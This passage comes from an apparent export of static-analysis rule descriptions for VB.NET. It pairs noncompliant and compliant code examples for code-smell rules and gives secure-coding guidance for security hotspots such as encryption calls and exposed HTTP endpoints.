</ul>
<p>In any of these cases, unconditional <code>if</code> statements should be removed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
    If True Then ' Noncompliant
      DoSomething()
    End If

    If False Then ' Noncompliant
      DoSomethingElse()
    End If
</pre>
<h2>Compliant Solution</h2>
<pre>
DoSomething();
' ...
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489.html"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570.html"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571.html"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
</ul>","Useless ""if(true) {...}"" and ""if(false){...}"" blocks should be removed",[],MAJOR,"['cwe', 'misra']",BUG
2019-02-14T16:27:56+0100,"<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
If a AndAlso ((x + y &gt; 0)) Then ' Noncompliant
    ' ...
End If

Return ((x + 1))  ' Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
If a AndAlso x + y &gt; 0 Then
    ' ...
End If

Return (x + 1)
</pre>",vbnet:S1110,vbnet,VB.NET,"<p>The use of parentheses, even those not required to enforce a desired order of operations, can clarify the intent behind a piece of code. But
redundant pairs of parentheses could be misleading, and should be removed. </p>
<h2>Noncompliant Code Example</h2>
<pre>
If a AndAlso ((x + y &gt; 0)) Then ' Noncompliant
    ' ...
End If

Return ((x + 1))  ' Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
If a AndAlso x + y &gt; 0 Then
    ' ...
End If

Return (x + 1)
</pre>",Redundant pairs of parentheses should be removed,[],MAJOR,['confusing'],CODE_SMELL
2019-02-14T16:27:56+0100,"<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If BooleanMethod() = True Then ' Noncompliant
  ' ...
End If
If BooleanMethod() = False Then ' Noncompliant
  ' ...
End If
If BooleanMethod() OrElse False Then ' Noncompliant
  ' ...
End If
DoSomething(Not False) ' Noncompliant
DoSomething(BooleanMethod() = True) ' Noncompliant

Dim booleanVariable = If(BooleanMethod(), True, False) ' Noncompliant
booleanVariable = If(BooleanMethod(), True, exp) ' Noncompliant
booleanVariable = If(BooleanMethod(), False, exp) ' Noncompliant
booleanVariable = If(BooleanMethod(), exp, True) ' Noncompliant
booleanVariable = If(BooleanMethod(), exp, False) ' Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
If BooleanMethod() Then
  ' ...
End If
If Not BooleanMethod() Then
  ' ...
End If
If BooleanMethod() Then
  ' ...
End If
DoSomething(True)
DoSomething(BooleanMethod())

Dim booleanVariable = BooleanMethod()
booleanVariable = BooleanMethod() OrElse exp
booleanVariable = Not BooleanMethod() AndAlso exp
booleanVariable = Not BooleanMethod() OrElse exp
booleanVariable = BooleanMethod() AndAlso exp
</pre>",vbnet:S1125,vbnet,VB.NET,"<p>Redundant Boolean literals should be removed from expressions to improve readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If BooleanMethod() = True Then ' Noncompliant
  ' ...
End If
If BooleanMethod() = False Then ' Noncompliant
  ' ...
End If
If BooleanMethod() OrElse False Then ' Noncompliant
  ' ...
End If
DoSomething(Not False) ' Noncompliant
DoSomething(BooleanMethod() = True) ' Noncompliant

Dim booleanVariable = If(BooleanMethod(), True, False) ' Noncompliant
booleanVariable = If(BooleanMethod(), True, exp) ' Noncompliant
booleanVariable = If(BooleanMethod(), False, exp) ' Noncompliant
booleanVariable = If(BooleanMethod(), exp, True) ' Noncompliant
booleanVariable = If(BooleanMethod(), exp, False) ' Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
If BooleanMethod() Then
  ' ...
End If
If Not BooleanMethod() Then
  ' ...
End If
If BooleanMethod() Then
  ' ...
End If
DoSomething(True)
DoSomething(BooleanMethod())

Dim booleanVariable = BooleanMethod()
booleanVariable = BooleanMethod() OrElse exp
booleanVariable = Not BooleanMethod() AndAlso exp
booleanVariable = Not BooleanMethod() OrElse exp
booleanVariable = BooleanMethod() AndAlso exp
</pre>",Boolean literals should not be redundant,[],MINOR,['clumsy'],CODE_SMELL
2019-02-14T16:27:55+0100,"<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<p>This rule raises an issue when a <code>private</code> procedure of a <code>Class</code>, <code>Module</code> or <code>Structure</code> takes a
parameter without using it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Private Sub DoSomething(ByVal a As Integer, ByVal b as Integer) ' ""b"" is unused
    Compute(a)
End Sub

Private Function DoSomething2(ByVal a As Integer, ByVal b As Integer) As Integer ' ""a"" is unused
    Compute(b)
    Return b
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Private Sub DoSomething(ByVal a As Integer)
    Compute(a)
End Sub

Private Function DoSomething2(ByVal b As Integer) As Integer
    Compute(b)
    Return b
End Function
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise any issue in the following contexts:</p>
<ul>
  <li> Procedures decorated with attributes. </li>
  <li> Empty procedures. </li>
  <li> Procedures which only throw <code>NotImplementedException</code>. </li>
  <li> Main methods. </li>
  <li> <code>virtual</code>, <code>override</code> procedures. </li>
  <li> Interface implementations. </li>
  <li> Event handlers. </li>
</ul>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 0-1-11 - There shall be no unused parameters (named or unnamed) in nonvirtual functions. </li>
  <li> MISRA C:2012, 2.7 - There should be no unused parameters in functions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",vbnet:S1172,vbnet,VB.NET,"<p>Unused parameters are misleading. Whatever the values passed to such parameters, the behavior will be the same.</p>
<p>This rule raises an issue when a <code>private</code> procedure of a <code>Class</code>, <code>Module</code> or <code>Structure</code> takes a
parameter without using it.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Private Sub DoSomething(ByVal a As Integer, ByVal b as Integer) ' ""b"" is unused
    Compute(a)
End Sub

Private Function DoSomething2(ByVal a As Integer, ByVal b As Integer) As Integer ' ""a"" is unused
    Compute(b)
    Return b
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Private Sub DoSomething(ByVal a As Integer)
    Compute(a)
End Sub

Private Function DoSomething2(ByVal b As Integer) As Integer
    Compute(b)
    Return b
End Function
</pre>
<h2>Exceptions</h2>
<p>This rule doesn't raise any issue in the following contexts:</p>
<ul>
  <li> Procedures decorated with attributes. </li>
  <li> Empty procedures. </li>
  <li> Procedures which only throw <code>NotImplementedException</code>. </li>
  <li> Main methods. </li>
  <li> <code>virtual</code>, <code>override</code> procedures. </li>
  <li> Interface implementations. </li>
  <li> Event handlers. </li>
</ul>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 0-1-11 - There shall be no unused parameters (named or unnamed) in nonvirtual functions. </li>
  <li> MISRA C:2012, 2.7 - There should be no unused parameters in functions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Unused procedure parameters should be removed,[],MAJOR,"['cert', 'misra', 'unused']",CODE_SMELL
2019-02-14T16:27:55+0100,"<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If condition1 Then
    If condition2 Then ' Noncompliant
        ' ...
    End If
End If
</pre>
<h2>Compliant Solution</h2>
<pre>
If condition1 AndAlso condition2 Then
    ' ...
End If
</pre>",vbnet:S1066,vbnet,VB.NET,"<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If condition1 Then
    If condition2 Then ' Noncompliant
        ' ...
    End If
End If
</pre>
<h2>Compliant Solution</h2>
<pre>
If condition1 AndAlso condition2 Then
    ' ...
End If
</pre>","Collapsible ""if"" statements should be merged",[],MAJOR,['clumsy'],CODE_SMELL
2018-11-29T11:10:38+0100,"<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902"">CVE-2017-7902</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378"">CVE-2006-1378</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376"">CVE-2003-1376</a> </li>
</ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p> </p>
<p>This rule flags function calls that initiate encryption/decryption. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>
  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>
  <li> the key exchange is made without properly authenticating the receiver. </li>
  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li>
  <li> the chosen encryption library is deemed unsafe. </li>
  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>
  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li>
  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it's IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li>
  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Generate encryption keys using secure random algorithms. </li>
  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li>
  <li> Regenerate the keys regularly. </li>
  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>
  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>
  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li>
  <li> When a nonce is used, generate it randomly every time. </li>
  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>
  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like ""Chosen-Plaintext Attacks"". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV's purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>
  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul>
      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul> </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
Imports System
Imports System.Security.Cryptography

Namespace MyNamespace

    Public Class Class1

        Public Sub Main()

            Dim data As Byte() = {1, 1, 1}

            Dim myRSA As RSA = RSA.Create()
            Dim padding As RSAEncryptionPadding = RSAEncryptionPadding.CreateOaep(HashAlgorithmName.SHA1)

            ' Review all base RSA class' Encrypt/Decrypt calls
            myRSA.Encrypt(data, padding)  ' Questionable
            myRSA.EncryptValue(data)      ' Questionable
            myRSA.Decrypt(data, padding)  ' Questionable
            myRSA.DecryptValue(data)      ' Questionable

            Dim myRSAC As RSACryptoServiceProvider = New RSACryptoServiceProvider()
            ' Review the use of any TryEncrypt/TryDecrypt And specific Encrypt/Decrypt of RSA subclasses.
            myRSAC.Encrypt(data, False)    ' Questionable
            myRSAC.Decrypt(data, False)    ' Questionable

            Dim written As Integer
            myRSAC.TryEncrypt(data, Span&lt;byte&gt;.Empty, padding, out written) ' Questionable
            myRSAC.TryDecrypt(data, Span&lt;byte&gt;.Empty, padding, out written) ' Questionable

            Dim rgbKey As Byte() = {1, 2, 3}
            Dim rgbIV As Byte() = {4, 5, 6}
            Dim rijn = SymmetricAlgorithm.Create()

            ' Review the creation of Encryptors from any SymmetricAlgorithm instance.
            rijn.CreateEncryptor()   ' Questionable
            rijn.CreateEncryptor(rgbKey, rgbIV)  ' Questionable
            rijn.CreateDecryptor()  ' Questionable
            rijn.CreateDecryptor(rgbKey, rgbIV)  ' Questionable
        End Sub

        Public Class MyCrypto
            Inherits System.Security.Cryptography.AsymmetricAlgorithm ' Questionable
            ' ...
        End Class

        Public Class MyCrypto2
            Inherits System.Security.Cryptography.SymmetricAlgorithm ' Questionable
            ' ...
        End Class
    End Class
End Namespace

</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/321.html"">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/322.html"">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/323.html"">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/324.html"">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/325.html"">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327.html"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/522.html"">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
  <li> [OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> [OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",vbnet:S4787,vbnet,VB.NET,"<p>Encrypting data is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7902"">CVE-2017-7902</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-1378"">CVE-2006-1378</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1376"">CVE-2003-1376</a> </li>
</ul>
<p>Proper encryption requires both the encryption algorithm and the key to be strong. Obviously the private key needs to remain secret and be renewed
regularly. However these are not the only means to defeat or weaken an encryption.</p>
<p> </p>
<p>This rule flags function calls that initiate encryption/decryption. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the private key might not be random, strong enough or the same key is reused for a long long time. </li>
  <li> the private key might be compromised. It can happen when it is stored in an unsafe place or when it was transferred in an unsafe manner. </li>
  <li> the key exchange is made without properly authenticating the receiver. </li>
  <li> the encryption algorithm is not strong enough for the level of protection required. Note that encryption algorithms strength decreases as time
  passes. </li>
  <li> the chosen encryption library is deemed unsafe. </li>
  <li> a nonce is used, and the same value is reused multiple times, or the nonce is not random. </li>
  <li> the RSA algorithm is used, and it does not incorporate an Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption.
  </li>
  <li> the CBC (Cypher Block Chaining) algorithm is used for encryption, and it's IV (Initialization Vector) is not generated using a secure random
  algorithm, or it is reused. </li>
  <li> the Advanced Encryption Standard (AES) encryption algorithm is used with an unsecure mode. See the recommended practices for more information.
  </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Generate encryption keys using secure random algorithms. </li>
  <li> When generating cryptographic keys (or key pairs), it is important to use a key length that provides enough entropy against brute-force
  attacks. For the Blowfish algorithm the key should be at least 128 bits long, while for the RSA algorithm it should be at least 2048 bits long.
  </li>
  <li> Regenerate the keys regularly. </li>
  <li> Always store the keys in a safe location and transfer them only over safe channels. </li>
  <li> If there is an exchange of cryptographic keys, check first the identity of the receiver. </li>
  <li> Only use strong encryption algorithms. Check regularly that the algorithm is still deemed secure. It is also imperative that they are
  implemented correctly. Use only encryption libraries which are deemed secure. Do not define your own encryption algorithms as they will most
  probably have flaws. </li>
  <li> When a nonce is used, generate it randomly every time. </li>
  <li> When using the RSA algorithm, incorporate an Optimal Asymmetric Encryption Padding (OAEP). </li>
  <li> When CBC is used for encryption, the IV must be random and unpredictable. Otherwise it exposes the encrypted value to crypto-analysis attacks
  like ""Chosen-Plaintext Attacks"". Thus a secure random algorithm should be used. An IV value should be associated to one and only one encryption
  cycle, because the IV's purpose is to ensure that the same plaintext encrypted twice will yield two different ciphertexts. </li>
  <li> The Advanced Encryption Standard (AES) encryption algorithm can be used with various modes. Galois/Counter Mode (GCM) with no padding should be
  preferred to the following combinations which are not secured:
    <ul>
      <li> Electronic Codebook (ECB) mode: Under a given key, any given plaintext block always gets encrypted to the same ciphertext block. Thus, it
      does not hide data patterns well. In some senses, it doesn't provide serious message confidentiality, and it is not recommended for use in
      cryptographic protocols at all. </li>
      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is susceptible to padding oracle attacks. </li>
    </ul> </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
Imports System
Imports System.Security.Cryptography

Namespace MyNamespace

    Public Class Class1

        Public Sub Main()

            Dim data As Byte() = {1, 1, 1}

            Dim myRSA As RSA = RSA.Create()
            Dim padding As RSAEncryptionPadding = RSAEncryptionPadding.CreateOaep(HashAlgorithmName.SHA1)

            ' Review all base RSA class' Encrypt/Decrypt calls
            myRSA.Encrypt(data, padding)  ' Questionable
            myRSA.EncryptValue(data)      ' Questionable
            myRSA.Decrypt(data, padding)  ' Questionable
            myRSA.DecryptValue(data)      ' Questionable

            Dim myRSAC As RSACryptoServiceProvider = New RSACryptoServiceProvider()
            ' Review the use of any TryEncrypt/TryDecrypt And specific Encrypt/Decrypt of RSA subclasses.
            myRSAC.Encrypt(data, False)    ' Questionable
            myRSAC.Decrypt(data, False)    ' Questionable

            Dim written As Integer
            myRSAC.TryEncrypt(data, Span&lt;byte&gt;.Empty, padding, out written) ' Questionable
            myRSAC.TryDecrypt(data, Span&lt;byte&gt;.Empty, padding, out written) ' Questionable

            Dim rgbKey As Byte() = {1, 2, 3}
            Dim rgbIV As Byte() = {4, 5, 6}
            Dim rijn = SymmetricAlgorithm.Create()

            ' Review the creation of Encryptors from any SymmetricAlgorithm instance.
            rijn.CreateEncryptor()   ' Questionable
            rijn.CreateEncryptor(rgbKey, rgbIV)  ' Questionable
            rijn.CreateDecryptor()  ' Questionable
            rijn.CreateDecryptor(rgbKey, rgbIV)  ' Questionable
        End Sub

        Public Class MyCrypto
            Inherits System.Security.Cryptography.AsymmetricAlgorithm ' Questionable
            ' ...
        End Class

        Public Class MyCrypto2
            Inherits System.Security.Cryptography.SymmetricAlgorithm ' Questionable
            ' ...
        End Class
    End Class
End Namespace

</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/321.html"">MITRE, CWE-321</a> - Use of Hard-coded Cryptographic Key </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/322.html"">MITRE, CWE-322</a> - Key Exchange without Entity Authentication </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/323.html"">MITRE, CWE-323</a> - Reusing a Nonce, Key Pair in Encryption </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/324.html"">MITRE, CWE-324</a> - Use of a Key Past its Expiration Date </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/325.html"">MITRE, CWE-325</a> - Missing Required Cryptographic Step </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/326.html"">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/327.html"">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/522.html"">MITRE, CWE-522</a> - Insufficiently Protected Credentials </li>
  <li> [OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> [OWASP Top 10 2017 Category A6 - Security Misconfiguration </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Encrypting data is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a3', 'owasp-a6', 'sans-top25-porous']",SECURITY_HOTSPOT
2019-02-14T16:27:55+0100,"<p>The <code>Select...Case</code> statement should be used only to clearly define some new branches in the control flow. As soon as a case clause
contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the case clause
should be extracted into a dedicated procedure.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
Select Case number
    Case 1 To 5 ' Noncompliant: 4 statements in the case
        MethodCall1("""")
        MethodCall2("""")
        MethodCall3("""")
        MethodCall4("""")
    Case Else
        ' ...
End Select
</pre>
<h2>Compliant Solution</h2>
<pre>
Select Case number
    Case 1 To 5
        DoSomething()
    Case Else
        ' ...
End Select
...
Sub DoSomething()
    MethodCall1("""")
    MethodCall2("""")
    MethodCall3("""")
    MethodCall4("""")
End Sub
</pre>",vbnet:S1151,vbnet,VB.NET,"<p>The <code>Select...Case</code> statement should be used only to clearly define some new branches in the control flow. As soon as a case clause
contains too many statements this highly decreases the readability of the overall control flow statement. In such case, the content of the case clause
should be extracted into a dedicated procedure.</p>
<h2>Noncompliant Code Example</h2>
<p>With the default threshold of 3:</p>
<pre>
Select Case number
    Case 1 To 5 ' Noncompliant: 4 statements in the case
        MethodCall1("""")
        MethodCall2("""")
        MethodCall3("""")
        MethodCall4("""")
    Case Else
        ' ...
End Select
</pre>
<h2>Compliant Solution</h2>
<pre>
Select Case number
    Case 1 To 5
        DoSomething()
    Case Else
        ' ...
End Select
...
Sub DoSomething()
    MethodCall1("""")
    MethodCall2("""")
    MethodCall3("""")
    MethodCall4("""")
End Sub
</pre>","""Select...Case"" clauses should not have too many lines of code","[{'key': 'max', 'htmlDesc': 'Maximum number of statements.', 'defaultValue': '8', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2019-02-14T16:27:55+0100,"<p>This rule applies whenever an <code>If</code> statement is followed by one or more <code>ElseIf</code> statements; the final <code>ElseIf</code>
should be followed by an <code>Else</code> statement.</p>
<p>The requirement for a final <code>Else</code> statement is defensive programming.</p>
<p>The <code>Else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>Case Else</code> clause in a <code>Select Case</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If x = 0 Then
    DoSomething()
ElseIf x = 1 Then
    DoSomethingElse()
End If
</pre>
<h2>Compliant Solution</h2>
<pre>
If x = 0 Then
    DoSomething()
ElseIf x = 1 Then
    DoSomethingElse()
Else
    Throw New ArgumentException(""..."")
End If
</pre>
<h2>Exceptions</h2>
<p>None</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PQHRAw"">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>",vbnet:S126,vbnet,VB.NET,"<p>This rule applies whenever an <code>If</code> statement is followed by one or more <code>ElseIf</code> statements; the final <code>ElseIf</code>
should be followed by an <code>Else</code> statement.</p>
<p>The requirement for a final <code>Else</code> statement is defensive programming.</p>
<p>The <code>Else</code> statement should either take appropriate action or contain a suitable comment as to why no action is taken. This is
consistent with the requirement to have a final <code>Case Else</code> clause in a <code>Select Case</code> statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If x = 0 Then
    DoSomething()
ElseIf x = 1 Then
    DoSomethingElse()
End If
</pre>
<h2>Compliant Solution</h2>
<pre>
If x = 0 Then
    DoSomething()
ElseIf x = 1 Then
    DoSomethingElse()
Else
    Throw New ArgumentException(""..."")
End If
</pre>
<h2>Exceptions</h2>
<p>None</p>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.10 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C++:2008, 6-4-2 - All if...else if constructs shall be terminated with an else clause. </li>
  <li> MISRA C:2012, 15.7 - All if...else if constructs shall be terminated with an else statement </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/YgE"">CERT, MSC01-C.</a> - Strive for logical completeness </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/PQHRAw"">CERT, MSC57-J.</a> - Strive for logical completeness </li>
</ul>","""If ... ElseIf"" constructs should end with ""Else"" clauses",[],CRITICAL,"['cert', 'misra']",CODE_SMELL
2019-02-14T16:27:54+0100,"<p>A procedure that grows too large tends to aggregate too many responsibilities.</p>
<p>Such procedures inevitably become harder to understand and therefore harder to maintain. </p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller procedures which focus on well-defined tasks.</p>
<p>Those smaller procedures will not only be easier to understand but also probably easier to test.</p>",vbnet:S138,vbnet,VB.NET,"<p>A procedure that grows too large tends to aggregate too many responsibilities.</p>
<p>Such procedures inevitably become harder to understand and therefore harder to maintain. </p>
<p>Above a specific threshold, it is strongly advised to refactor into smaller procedures which focus on well-defined tasks.</p>
<p>Those smaller procedures will not only be easier to understand but also probably easier to test.</p>",Procedures should not have too many lines of code,"[{'key': 'max', 'htmlDesc': 'Maximum authorized lines of code in a method', 'defaultValue': '80', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2018-11-29T11:10:38+0100,"<p>Exposing HTTP endpoints is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-3072"">CVE-2016-3072</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3175"">CVE-2015-3175</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0218"">CVE-2003-0218</a> </li>
</ul>
<p>HTTP endpoints are webservices' main entrypoint. Attackers will take advantage of any vulnerability by sending crafted inputs for headers
(including cookies), body and URI. No input should be trusted and extreme care should be taken with all returned value (header, body and status
code).</p>
<p>This rule flags code which creates HTTP endpoint via .Net Framework MVC Controllers. It guides security code reviews to security-sensitive
code.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> an input is not sanitized before being used. This includes any value coming from the URI, header, body and cookies. </li>
  <li> the response contains some unsafe data. for example the input could come from a database which contains user inputs. Check the response's
  headers, cookies, body and status code. </li>
  <li> the response contains some sensitive information which the user shouldn't have access to. </li>
</ul>
<p>no access control prevents attackers from successfully performing a forbidden request.</p>
<ul>
  <li> an attacker can get sensitive information by analyzing the returned errors. For example, a web service can expose the existence of user
  accounts by returning 403 (Forbidden) instead of 404 (Not Found) when an attacker ask for them. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Never trust any part of the request to be safe. Make sure that the URI, header and body are properly <a
href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">sanitized</a> before being used. Their content, length, encoding, name (ex: name
of URL query parameters) should be checked. Validate that the values are in a predefined whitelist. The opposite, i.e. searching for dangerous values
in a given input, can easily miss some of them.</p>
<p>Do not rely solely on cookies when you implement your authentication and permission logic. Use additional protections such as <a
href=""https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet"">CSRF</a> tokens when possible.</p>
<p>Do not expose sensitive information in your response. If the endpoint serves files, limit the access to a dedicated directory. <a
href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet#Cookies"">Protect your sensitive cookies</a> so that client-side javascript cannot
read or modify them.</p>
<p>Sanitize all values before returning them in a response, be it in the body, header or status code. Special care should be taken to avoid the
following attacks:</p>
<ul>
  <li> <a href=""https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet"">Cross-site Scripting (XSS)</a>, which happens when
  an unsafe value is included in an HTML page. </li>
  <li> <a href=""https://www.owasp.org/index.php/Unvalidated_Redirects_and_Forwards_Cheat_Sheet"">Unvalidated redirects</a> which can happen when the
  <code>Location</code> header is compromised. </li>
</ul>
<p>Restrict security-sensitive actions, such as file upload, to authenticated users.</p>
<p>Be careful when errors are returned to the client, as they can provide sensitive information. Use 404 (Not Found) instead of 403 (Forbidden) when
the existence of a resource is sensitive.</p>
<h2>Questionable Code Example</h2>
<pre>
Public Class Foo
    Inherits System.Web.Mvc.Controller

    Public Property MyProperty As String
        Get
